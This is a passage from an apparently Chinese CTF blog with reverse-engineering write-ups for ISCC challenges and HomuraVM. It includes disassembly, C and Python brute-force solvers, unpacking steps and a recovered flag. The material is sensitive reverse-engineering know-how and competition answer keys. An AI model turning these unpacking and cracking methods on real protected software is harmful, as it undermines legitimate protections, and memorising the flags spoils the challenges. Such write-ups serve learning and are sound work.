class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">CODE:00159BE4                 new-instance                    output, &lt;t: StringBuilder&gt;</span><br><span class="line">CODE:00159BE8                 invoke-direct                   &#123;output&#125;, &lt;void StringBuilder.&lt;init&gt;() imp. @ _def_StringBuilder__init_@V&gt;</span><br><span class="line">CODE:00159BEE                 .line 17</span><br><span class="line">CODE:00159BEE                 const/4                         i, 0</span><br><span class="line">CODE:00159BF0</span><br><span class="line">CODE:00159BF0 loc_159BF0:                             # CODE XREF: CODE:00159D44↓j</span><br><span class="line">CODE:00159BF0                 invoke-virtual                  &#123;i1&#125;, &lt;int String.length() imp. @ _def_String_length@I&gt;</span><br><span class="line">CODE:00159BF6                 move-result                     v5</span><br><span class="line">CODE:00159BF8                 if-ge                           i, v5, loc_159D48</span><br><span class="line">CODE:00159BFC                 .line 18</span><br><span class="line">CODE:00159BFC                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159C00                 aget-object                     v5, v5, 0</span><br><span class="line">CODE:00159C04                 aget                            v5, v5, 0</span><br><span class="line">CODE:00159C08                 invoke-virtual                  input[i]</span><br><span class="line">CODE:00159C0E                 move-result                     v6 = input[i]</span><br><span class="line">CODE:00159C10                 add-int/lit8                    v6 = input[i] - 0x41</span><br><span class="line">CODE:00159C14                 mul-int/2addr                   v5 = (input[i] - 0x41)*key[0][0]</span><br><span class="line">CODE:00159C16                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C1A                 aget-object                     v6, v6, 0</span><br><span class="line">CODE:00159C1E                 aget                            v6, v6, 1</span><br><span class="line">CODE:00159C22                 add-int/lit8                    v7 = i + 1</span><br><span class="line">CODE:00159C26                 .line 19</span><br><span class="line">CODE:00159C26                 invoke-virtual                  input[i + 1]</span><br><span class="line">CODE:00159C2C                 move-result                     v7 = input[i + 1]</span><br><span class="line">CODE:00159C2E                 add-int/lit8                    v7 = input[i + 1] - 0x41</span><br><span class="line">CODE:00159C32                 mul-int/2addr                   v6 = (input[i + 1] - 0x41)*key[0][1]</span><br><span class="line">CODE:00159C34                 add-int/2addr                   v5, += v6</span><br><span class="line">CODE:00159C36                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C3A                 aget-object                     v6, v6, 0</span><br><span class="line">CODE:00159C3E                 aget                            v6, v6, 2</span><br><span class="line">CODE:00159C42                 add-int/lit8                    v7 = i + 2</span><br><span class="line">CODE:00159C46                 .line 20</span><br><span class="line">CODE:00159C46                 invoke-virtual                  input[i + 2]</span><br><span class="line">CODE:00159C4C                 move-result                     v7 = input[i + 2]</span><br><span class="line">CODE:00159C4E                 add-int/lit8                    v7 = input[i + 2] - 0x41</span><br><span class="line">CODE:00159C52                 mul-int/2addr                   v6 = (input[i + 2] - 0x41)*key[0][2]</span><br><span class="line">CODE:00159C54                 add-int                         a1 = (input[i] - 0x41)*key[0][0] + (input[i + 1] - 0x41)*key[0][1] + (input[i + 2] - 0x41)*key[0][2]</span><br><span class="line">CODE:00159C58                 .line 21</span><br><span class="line">CODE:00159C58                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159C5C                 aget-object                     v5, v5, 1</span><br><span class="line">CODE:00159C60                 aget                            v5, v5, 0</span><br><span class="line">CODE:00159C64                 invoke-virtual                  input[i]</span><br><span class="line">CODE:00159C6A                 move-result                     v6</span><br><span class="line">CODE:00159C6C                 add-int/lit8                    v6, v6, - 0x41</span><br><span class="line">CODE:00159C70                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C72                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C76                 aget-object                     v6, v6, 1</span><br><span class="line">CODE:00159C7A                 aget                            v6, v6, 1</span><br><span class="line">CODE:00159C7E                 add-int/lit8                    v7, i, 1</span><br><span class="line">CODE:00159C82                 .line 22</span><br><span class="line">CODE:00159C82                 invoke-virtual                  input[v7]</span><br><span class="line">CODE:00159C88                 move-result                     v7</span><br><span class="line">CODE:00159C8A                 add-int/lit8                    v7 = v7 - 0x41</span><br><span class="line">CODE:00159C8E                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159C90                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C92                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C96                 aget-object                     v6, v6, 1</span><br><span class="line">CODE:00159C9A                 aget                            v6, v6, 2</span><br><span class="line">CODE:00159C9E                 add-int/lit8                    v7, i, 2</span><br><span class="line">CODE:00159CA2                 .line 23</span><br><span class="line">CODE:00159CA2                 invoke-virtual                  input[v7]</span><br><span class="line">CODE:00159CA8                 move-result                     v7</span><br><span class="line">CODE:00159CAA                 add-int/lit8                    v7 = v7 - 0x41</span><br><span class="line">CODE:00159CAE                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159CB0                 add-int                         a2, v5, v6</span><br><span class="line">CODE:00159CB4                 .line 24</span><br><span class="line">CODE:00159CB4                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159CB8                 aget-object                     v5, v5, 2</span><br><span class="line">CODE:00159CBC                 aget                            v5, v5, 0</span><br><span class="line">CODE:00159CC0                 invoke-virtual                  input[i]</span><br><span class="line">CODE:00159CC6                 move-result                     v6</span><br><span class="line">CODE:00159CC8                 add-int/lit8                    v6, v6, - 0x41</span><br><span class="line">CODE:00159CCC                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159CCE                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159CD2                 aget-object                     v6, v6, 2</span><br><span class="line">CODE:00159CD6                 aget                            v6, v6, 1</span><br><span class="line">CODE:00159CDA                 add-int/lit8                    v7, i, 1</span><br><span class="line">CODE:00159CDE                 .line 25</span><br><span class="line">CODE:00159CDE                 invoke-virtual                  input[v7]</span><br><span class="line">CODE:00159CE4                 move-result                     v7</span><br><span class="line">CODE:00159CE6                 add-int/lit8                    v7 = v7 - 0x41</span><br><span class="line">CODE:00159CEA                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159CEC                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159CEE                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159CF2                 aget-object                     v6, v6, 2</span><br><span class="line">CODE:00159CF6                 aget                            v6, v6, 2</span><br><span class="line">CODE:00159CFA                 add-int/lit8                    v7, i, 2</span><br><span class="line">CODE:00159CFE                 .line 26</span><br><span class="line">CODE:00159CFE                 invoke-virtual                  input[v7]</span><br><span class="line">CODE:00159D04                 move-result                     v7</span><br><span class="line">CODE:00159D06                 add-int/lit8                    v7 = v7 - 0x41</span><br><span class="line">CODE:00159D0A                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159D0C                 add-int                         a3, v5, v6</span><br><span class="line">CODE:00159D10                 .line 27</span><br><span class="line">CODE:00159D10                 rem-int/lit8                    v5 = a1 % 26</span><br><span class="line">CODE:00159D14                 add-int/lit8                    v5 = v5 + 0x41</span><br><span class="line">CODE:00159D18                 int-to-char                     v5 = chr(v5)</span><br><span class="line">CODE:00159D1A                 invoke-virtual                  output.append[v5]</span><br><span class="line">CODE:00159D20                 .line 28</span><br><span class="line">CODE:00159D20                 rem-int/lit8                    v5, a2, 26</span><br><span class="line">CODE:00159D24                 add-int/lit8                    v5, v5, 65</span><br><span class="line">CODE:00159D28                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D2A                 invoke-virtual                  output.append[v5]</span><br><span class="line">CODE:00159D30                 .line 29</span><br><span class="line">CODE:00159D30                 rem-int/lit8                    v5, a3, 26</span><br><span class="line">CODE:00159D34                 add-int/lit8                    v5, v5, 0x41</span><br><span class="line">CODE:00159D38                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D3A                 invoke-virtual                  output.append[v5]</span><br><span class="line">CODE:00159D40                 .line 17</span><br><span class="line">CODE:00159D40                 add-int/lit8                    i += 3</span><br><span class="line">CODE:00159D44                 goto/16</span><br></pre></td></tr></table></figure>

<ul>
<li><p>感觉挺像希尔加密的,但是现场不好去外网找工具,直接爆破好了</p>
</li>
<li><p>爆破后发现有多解…maye,可能是取模的原因,但是希尔密码应该不是这样的啊…先不管这些,从爆出来的一些字符串,可以拼出flag的值 key{We1c0me_T0_1SCC2IO8}</p>
</li>
<li><p>好的爆破脚本在这里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> m[<span class="number">9</span>] = &#123;<span class="number">17</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag_enc[<span class="number">25</span>]=&#123;<span class="number">79</span>, <span class="number">89</span>, <span class="number">85</span>, <span class="number">71</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">72</span>, <span class="number">62</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">67</span>, <span class="number">66</span>, <span class="number">88</span>, <span class="number">70</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">47</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">89</span>, <span class="number">89</span>, <span class="number">69</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> ra,c1,c2,c3;</span><br><span class="line">    <span class="keyword">for</span>(ra = <span class="number">0</span>;ra &lt;<span class="number">8</span>;ra++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(c1 = <span class="number">48</span>;c1 &lt; <span class="number">127</span>; c1++)</span><br><span class="line">            <span class="keyword">for</span>(c2 = <span class="number">48</span>;c2 &lt; <span class="number">127</span>; c2++)</span><br><span class="line">                <span class="keyword">for</span>(c3 = <span class="number">48</span>;c3 &lt; <span class="number">127</span>; c3++)&#123;</span><br><span class="line">                        <span class="keyword">int</span> a1 = (c1<span class="number">-65</span>)*m[<span class="number">0</span>] + (c2<span class="number">-65</span>)*m[<span class="number">1</span>] + (c3<span class="number">-65</span>)*m[<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">int</span> a2 = (c1<span class="number">-65</span>)*m[<span class="number">3</span>] + (c2<span class="number">-65</span>)*m[<span class="number">4</span>] + (c3<span class="number">-65</span>)*m[<span class="number">5</span>];</span><br><span class="line">                        <span class="keyword">int</span> a3 = (c1<span class="number">-65</span>)*m[<span class="number">6</span>] + (c2<span class="number">-65</span>)*m[<span class="number">7</span>] + (c3<span class="number">-65</span>)*m[<span class="number">8</span>];</span><br><span class="line">                        <span class="keyword">if</span>(<span class="number">65</span> + a1%<span class="number">26</span> == flag_enc[ra*<span class="number">3</span> + <span class="number">0</span>]&amp;&amp;</span><br><span class="line">                        <span class="number">65</span> + a2%<span class="number">26</span> == flag_enc[ra*<span class="number">3</span> + <span class="number">1</span>]&amp;&amp;</span><br><span class="line">                        <span class="number">65</span> + a3%<span class="number">26</span> == flag_enc[ra*<span class="number">3</span> + <span class="number">2</span>])&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"%c%c%c "</span>,c1,c2,c3);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n===================================================================\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>之后py了出题的师傅,师傅说这是一个自己做的壳,一开始还想加反调试和混淆(还要感谢出题师傅手下留情 ,不过正确的思路据说是修复一下直接上jd-gui,我太菜了所以绕了远路只好硬怼汇编= =</p>
</li>
<li><p>还要说一下不同语言的取余操作内部好像是不一样的,比如c语言对负数取余就能出负数,而python只能是正数,一开始被这个鸟东西坑了好久..</p>
</li>
<li><p>还是要感谢北理的师傅们的,也学到了很多东西,希望明年还能来打(逃</p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/iscc安卓逆向/" data-id="cjyn83qfu003bicth07ryi96c" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-iscc" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/iscc/" class="article-date">
  <time datetime="2019-07-28T17:11:01.676Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/二进制/">二进制</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/iscc/">ISCC逆向wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="re150"><a href="#re150" class="headerlink" title="re150"></a>re150</h1><ul>
<li>upx壳,重定位,选择带壳调试,OD载入,在入口点单步,然后在数据窗口ESP处下硬件断点</li>
<li>运行程序,程序断在popad下一行,此时定位目标字符串,在校验函数处下第二断点</li>
<li>运行程序,从寄存器中跟随,找到扰乱后的测试字符串,跑脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="string">"edfgcbhia0jk98lm76no54pq32rs1"</span></span><br><span class="line">enc = <span class="string">"s_imsaplw_e_siishtnt&#123;g_ialt&#125;F"</span></span><br><span class="line">table = <span class="string">"1234567890abcdefghijklmnopqrs"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    flag += enc[n.index(i)]</span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="re250"><a href="#re250" class="headerlink" title="re250"></a>re250</h1><ul>
<li>两个函数,由while组成,看下逻辑图,典型控制流平坦化(0llvm)</li>
<li>下断后动态调试,得知程序算法(后知是矩阵乘法)</li>
<li>分析第二个函数,发现输入的数组输出就是其base64,即原生base64</li>
<li>选择爆破</li>
<li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> base64[<span class="number">64</span>] = <span class="string">"FeVYKw6a0lDIOsnZQ5EAf2MvjS1GUiLWPTtH4JqRgu3dbC8hrcNo9/mxzpXBky7+"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> m[<span class="number">16</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  <span class="number">4294967291</span>,</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  <span class="number">4294967293</span>,</span><br><span class="line">  <span class="number">4294967295</span>,</span><br><span class="line">  <span class="number">4294967294</span>,</span><br><span class="line">  <span class="number">4294967293</span>,</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  <span class="number">4294967295</span>,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  <span class="number">4294967294</span>,</span><br><span class="line">  <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">num_strchr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *pindex = <span class="built_in">strchr</span>(str, c);</span><br><span class="line">	<span class="keyword">return</span> pindex - str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dbase64</span><span class="params">(<span class="keyword">char</span> *s,<span class="keyword">char</span> * encode_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (s[i] != <span class="string">'='</span>)</span><br><span class="line">			a[i] = num_strchr(base64, s[i]);</span><br><span class="line">		<span class="keyword">if</span> (s[i + <span class="number">1</span>] != <span class="string">'='</span>)</span><br><span class="line">			a[i + <span class="number">1</span>] = num_strchr(base64, s[i + <span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">if</span> (s[i + <span class="number">2</span>] != <span class="string">'='</span>)</span><br><span class="line">			a[i + <span class="number">2</span>] = num_strchr(base64, s[i + <span class="number">2</span>]);</span><br><span class="line">		<span class="keyword">if</span> (s[i + <span class="number">3</span>] != <span class="string">'='</span>)</span><br><span class="line">			a[i + <span class="number">3</span>] = num_strchr(base64, s[i + <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>, j += <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		encode_flag[j] = a[i] &lt;&lt; <span class="number">2</span> | a[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">		encode_flag[j + <span class="number">1</span>] = (a[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span> | a[i + <span class="number">2</span>] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">		encode_flag[j + <span class="number">2</span>] = (a[i + <span class="number">2</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">6</span> | a[i + <span class="number">3</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag_b64enc[<span class="number">32</span>] = <span class="string">"lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq"</span>;</span><br><span class="line">    <span class="keyword">char</span> flag_enc[<span class="number">24</span>];</span><br><span class="line">    <span class="keyword">char</span> t[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ra,i,j,c1,c2,c3,c4;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    dbase64(flag_b64enc,flag_enc);</span><br><span class="line">    <span class="comment">// for(i = 0;i &lt; 24;i++)&#123;</span></span><br><span class="line">    <span class="comment">//     printf("%x,",flag_enc[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    ra = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(ra = <span class="number">0</span>;ra &lt;<span class="number">6</span>;ra++)</span><br><span class="line">    <span class="keyword">for</span>(c1 = <span class="number">33</span>;c1 &lt; <span class="number">127</span>; c1++)</span><br><span class="line">        <span class="keyword">for</span>(c2 = <span class="number">33</span>;c2 &lt; <span class="number">127</span>; c2++)</span><br><span class="line">            <span class="keyword">for</span>(c3 = <span class="number">33</span>;c3 &lt; <span class="number">127</span>; c3++)</span><br><span class="line">                <span class="keyword">for</span>(c4 = <span class="number">33</span>;c4 &lt; <span class="number">127</span>; c4++)&#123;</span><br><span class="line">                    t[<span class="number">0</span>]=c1;</span><br><span class="line">                    t[<span class="number">1</span>]=c2;</span><br><span class="line">                    t[<span class="number">2</span>]=c3;</span><br><span class="line">                    t[<span class="number">3</span>]=c4;</span><br><span class="line">                    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)&#123;</span><br><span class="line">                            p[i] += m[i*<span class="number">4</span> + j] * t[j];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(((<span class="keyword">char</span>)p[<span class="number">0</span>] == flag_enc[ra*<span class="number">4</span> + <span class="number">0</span>])&amp;&amp;((<span class="keyword">char</span>)p[<span class="number">1</span>] == flag_enc[ra*<span class="number">4</span> + <span class="number">1</span>])&amp;&amp;((<span class="keyword">char</span>)p[<span class="number">2</span>] == flag_enc[ra*<span class="number">4</span> + <span class="number">2</span>])&amp;&amp;((<span class="keyword">char</span>)p[<span class="number">3</span>] == flag_enc[ra*<span class="number">4</span> + <span class="number">3</span>]))&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>,c1,c2,c3,c4);</span><br><span class="line">                    &#125;</span><br><span class="line">                    p[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">                    p[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">                    p[<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">                    p[<span class="number">3</span>]=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/iscc/" data-id="cjyn83qei0016icthud5ryhdv" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-HomuraVM" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/HomuraVM/" class="article-date">
  <time datetime="2019-07-28T17:11:01.671Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/HomuraVM/">CTF二进制学习0X04</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="HomuraVM"><a href="#HomuraVM" class="headerlink" title="HomuraVM"></a>HomuraVM</h1><ul>
<li>主要是对一个类似BF的解释器逆向,里面到处充满了反调试,在解析字节码后,两种循环各自可以实现一个input[i]和变量a,b之间的赋值操作,还有的字节码可以实现输入下标的移动,具体的字节码对应的操作在解释器中非常清晰,h为i++,所以以他为每一组语句头,在对900多字节的字节码分组后,正好分为了34组,验证函数中,flag长度也正好是34,在逆最后解析出的算法时,可以采取两种操作,一种是动态调试,找到规律,另一种可以爆破求值.</li>
</ul>
<blockquote>
<p>G: reg2 -= 1<br>MC: reg2 = reg1 ^ input[i]<br>T: reg2 += 1<br>a: reg1 -= 1<br>h: input[i++]<br>o: input[i–]<br>m: input[i] += 1<br>r: reg1 += 1<br>u: input[i] -= 1<br>v: reg2 = reg1<br>[ur]: reg1 += input[i] input[i] = 0<br>{mG}: input[i] += reg2 reg2=0<br>{aG}: reg1 -= reg2 reg2=0</p>
</blockquote>
<p>input[i] ^= (input[i+1]+x)</p>
<blockquote>
<p>h[ur]ovMCh{mG}<br>h[ur]ovaaaMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovMCh{mG}<br>h[ur]ovrrrMCh{mG}<br>h[ur]ovaaMCh{mG}<br>h[ur]ovrMCh{mG}<br>h[ur]ovrrrrrMCh{mG}<br>h[ur]ovrMCh{mG}<br>h[ur]ovaMCh{mG}<br>h[ur]ovrrrrMCh{mG}<br>h[ur]ovaMCh{mG}<br>h[ur]ovMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovrrrrrMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovaaMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovrMCh{mG}<br>h[ur]ovrMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovrrrrrrMCh{mG}<br>h[ur]ovaaaMCh{mG}<br>h[ur]ovaMCh{mG}<br>h[ur]ovaMCh{mG}<br>h[ur]ovrrMCh{mG}<br>h[ur]ovaaMCh{mG}<br>h[ur]ovaMCh{mG}<br>h[ur]ovMCh{mG}</p>
</blockquote>
<pre><code class="python">offset=[]
flag = <span class="string">""</span>
